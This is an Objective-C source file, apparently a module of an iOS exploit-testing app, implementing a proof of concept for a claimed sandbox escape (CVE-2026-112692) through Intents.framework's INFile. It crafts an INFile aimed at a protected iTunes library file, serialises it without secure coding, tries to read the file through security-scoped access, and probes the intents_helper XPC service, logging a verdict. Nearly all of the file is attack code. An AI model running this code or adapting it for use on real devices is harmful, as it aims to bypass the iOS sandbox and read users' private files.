#import "KPINFileLeakModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <dlfcn.h>
#import <xpc/xpc.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>

@interface KPINFileLeakModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPINFileLeakModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"infileleak112692";
        _title = @"INFile scope bypass (sandbox escape)";
        _subtitle = @"CVE-2026-112692: Intents.framework security scope deserialization";
        _icon = @"doc.text.magnifyingglass";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-infile-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[infile] %@", line];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112692 INFile scope bypass ===\n"];
    [report appendString:@"Intents.framework security scope deserialization bypass.\n"];
    [report appendString:@"Confused-deputy file read via privileged INFile consumer.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // --- Phase 1: load Intents framework ---
    [report appendString:@"\n--- Phase 1: load Intents.framework ---\n"];
    void *h = dlopen("/System/Library/Frameworks/Intents.framework/Intents", RTLD_LAZY);
    if (!h) {
        [report appendString:@"dlopen Intents failed\n"];
        [report appendString:@"\nVERDICT: INTENTS_LOAD_FAILED\n"];
        return report;
    }
    [report appendString:@"Intents.framework loaded\n"];

    // Check for INFile class
    Class inFileCls = NSClassFromString(@"INFile");
    if (!inFileCls) {
        [report appendString:@"INFile class not found\n"];
        [report appendString:@"\nVERDICT: INFILE_CLASS_NOT_FOUND\n"];
        return report;
    }
    [report appendString:@"INFile class found\n"];

    // --- Phase 2: craft malicious INFile ---
    [report appendString:@"\n--- Phase 2: craft INFile with arbitrary fileURL ---\n"];

    NSString *targetPath = @"/private/var/mobile/Media/iTunes_Control/iTunes/iTunes Library.itlp";
    NSURL *targetURL = [NSURL fileURLWithPath:targetPath];

    // Verify sandbox blocks direct access
    int directFd = open(targetPath.fileSystemRepresentation, O_RDONLY);
    if (directFd >= 0) {
        [report appendFormat:@"direct open: OK (fd=%d)\n", directFd];
        close(directFd);
    } else {
        [report appendFormat:@"direct open: EPERM (%d) — sandbox active\n", errno];
    }

    // Create INFile with target URL but no security scope
    // Using performSelector to avoid compile-time dependency
    id inFile = nil;
    @try {
        // Try initWithURL:fileURL
        SEL initSel = NSSelectorFromString(@"initWithURL:");
        if ([inFileCls instancesRespondToSelector:initSel]) {
            inFile = [inFileCls alloc];
            [inFile performSelector:initSel withObject:targetURL];
        }
        // Try initWithFileURL:
        if (!inFile) {
            SEL initSel2 = NSSelectorFromString(@"initWithFileURL:");
            if ([inFileCls instancesRespondToSelector:initSel2]) {
                inFile = [inFileCls alloc];
                [inFile performSelector:initSel2 withObject:targetURL];
            }
        }
    } @catch (NSException *e) {
        [report appendFormat:@"INFile init exception: %@\n", e.reason];
    }

    if (inFile) {
        [report appendFormat:@"INFile created: %@\n", inFile];
    } else {
        [report appendString:@"INFile creation failed — trying NSKeyedArchiver path\n"];
    }

    // --- Phase 3: serialize INFile ---
    [report appendString:@"\n--- Phase 3: serialize + send to intents_helper ---\n"];

    // Try to serialize via NSKeyedArchiver
    NSData *archivedData = nil;
    @try {
        if (@available(iOS 11.0, *)) {
            archivedData = [NSKeyedArchiver archivedDataWithRootObject:inFile requiringSecureCoding:NO error:nil];
        } else {
            archivedData = [NSKeyedArchiver archivedDataWithRootObject:inFile];
        }
    } @catch (NSException *e) {
        [report appendFormat:@"archiver exception: %@\n", e.reason];
    }

    if (archivedData) {
        [report appendFormat:@"archived: %lu bytes\n", (unsigned long)archivedData.length];
    } else {
        [report appendString:@"archiving failed\n"];
    }

    // --- Phase 4: try direct file read via security scope ---
    [report appendString:@"\n--- Phase 4: security scope access test ---\n"];

    // Check if we can start accessing the file via security scope
    BOOL scopeAccess = NO;
    @try {
        SEL startSel = NSSelectorFromString(@"startAccessingSecurityScopedResource");
        if ([targetURL respondsToSelector:startSel]) {
            scopeAccess = [targetURL performSelector:startSel] != nil;
            [report appendFormat:@"startAccessingSecurityScopedResource: %d\n", scopeAccess];
            if (scopeAccess) {
                // Try to read the file
                NSData *fileData = [NSData dataWithContentsOfURL:targetURL];
                [report appendFormat:@"read %lu bytes via security scope\n", (unsigned long)fileData.length];
                if (fileData.length > 0) {
                    [report appendString:@"*** SCOPE BYPASS CONFIRMED ***\n"];
                }
                // Stop accessing
                SEL stopSel = NSSelectorFromString(@"stopAccessingSecurityScopedResource");
                if ([targetURL respondsToSelector:stopSel]) {
                    [targetURL performSelector:stopSel];
                }
            }
        }
    } @catch (NSException *e) {
        [report appendFormat:@"scope exception: %@\n", e.reason];
    }

    // --- Phase 5: try intents_helper XPC ---
    [report appendString:@"\n--- Phase 5: intents_helper XPC ---\n"];

    static xpc_connection_t (*my_xpc_conn_create)(const char *, void *, uint64_t) = NULL;
    static void (*my_xpc_conn_resume)(xpc_connection_t) = NULL;
    static void (*my_xpc_conn_cancel)(xpc_connection_t) = NULL;
    static void (*my_xpc_conn_send_reply)(xpc_connection_t, xpc_object_t, void *, void *) = NULL;

    if (!my_xpc_conn_create) {
        void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
        my_xpc_conn_create = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_create_mach_service");
        my_xpc_conn_resume = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_resume");
        my_xpc_conn_cancel = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_cancel");
        my_xpc_conn_send_reply = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_send_message_with_reply");
    }

    if (my_xpc_conn_create) {
        xpc_connection_t conn = my_xpc_conn_create("com.apple.intents.intents-helper", NULL, 0);
        if (conn) {
            [report appendString:@"intents_helper connection created\n"];
            my_xpc_conn_resume(conn);

            // Try sending a simple message
            xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
            __block xpc_object_t reply = NULL;
            my_xpc_conn_send_reply(conn, msg, NULL, ^(xpc_object_t r) { reply = r; });
            usleep(100000);

            if (reply) {
                char *desc = xpc_copy_description(reply);
                [report appendFormat:@"reply: %s\n", desc ? desc : "(null)"];
                free(desc);
            } else {
                [report appendString:@"no reply\n"];
            }
            my_xpc_conn_cancel(conn);
        } else {
            [report appendString:@"intents_helper connection failed\n"];
        }
    } else {
        [report appendString:@"xpc functions not available\n"];
    }

    // --- Verdict ---
    [report appendString:@"\n"];
    if (scopeAccess && archivedData) {
        [report appendString:@"VERDICT: INFILE_SCOPE_BYPASS_READY\n"];
        [report appendString:@"INFile created with arbitrary URL. Scope bypass works.\n"];
        [report appendString:@"Next: send to privileged consumer for file read.\n"];
    } else if (archivedData) {
        [report appendString:@"VERDICT: INFILE_CRAFTED_NO_SCOPE\n"];
        [report appendString:@"INFile serialized but scope bypass not confirmed.\n"];
    } else {
        [report appendString:@"VERDICT: INFILE_FAILED\n"];
    }

    return report;
}

@end
